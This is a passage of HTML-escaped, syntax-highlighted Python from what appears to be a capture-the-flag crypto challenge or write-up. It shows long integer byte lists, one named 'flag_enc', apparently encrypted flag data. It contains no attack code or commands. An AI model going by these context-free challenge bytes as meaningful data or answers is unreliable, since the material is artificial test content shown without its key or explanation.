class=&#34;mi&#34;&gt;75&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;211&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;132&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;214&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;239&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;102&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;58&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;68&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;130&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;204&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;225&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;76&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;152&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;216&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;74&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;149&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;79&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;165&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;198&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;72&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;150&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;94&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;177&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;46&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;226&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;252&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;247&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;79&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;62&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;69&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;106&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;106&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;236&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;47&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;145&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;170&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;152&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;131&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;37&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;168&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;99&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;27&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;220&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;150&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;89&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;82&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;232&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;170&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;107&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;221&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;212&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;46&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;235&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;129&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;66&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;217&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;222&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;217&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;192&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;247&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;192&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;113&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;230&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;129&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;196&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;247&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;148&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;228&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;225&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;86&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;71&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;133&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;132&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;238&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;236&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;83&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;107&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;141&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;114&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;150&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;182&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;146&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;213&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;250&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;141&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;53&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;114&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;198&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;70&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;133&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;17&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;247&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;173&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;136&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;73&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;236&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;78&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;188&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;150&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;239&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;58&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;199&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;136&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;122&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;134&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;77&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;47&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;167&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;137&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;188&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;55&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;195&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;41&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;49&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;245&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;92&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;160&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;213&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;254&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;85&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;205&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;193&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;69&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;140&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;143&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;155&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;236&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;179&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;199&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;168&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;35&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;85&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;174&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;flag_enc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;198&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;143&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;247&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;152&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;139&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;131&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;84&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;181&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;180&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;252&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;177&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;192&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;217&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;179&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;136&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;107&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;190&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;62&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;90&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;53&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;105&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;238&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;117&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;44&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;132&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;195&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;214&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;171&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;113&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;209&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;194&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;174&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;228&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;212&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;196&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;27&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;41&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;211&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;56&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;139&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;135&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;225&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;214&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;89&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;122&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;178&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;212&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;185&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;231&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;204&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;150&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;204&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;212&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;160&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;142&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;213&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;173&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;186&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;166&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;65&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;238&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;189&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;148&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;38&lt;/span&gt;&lt;span 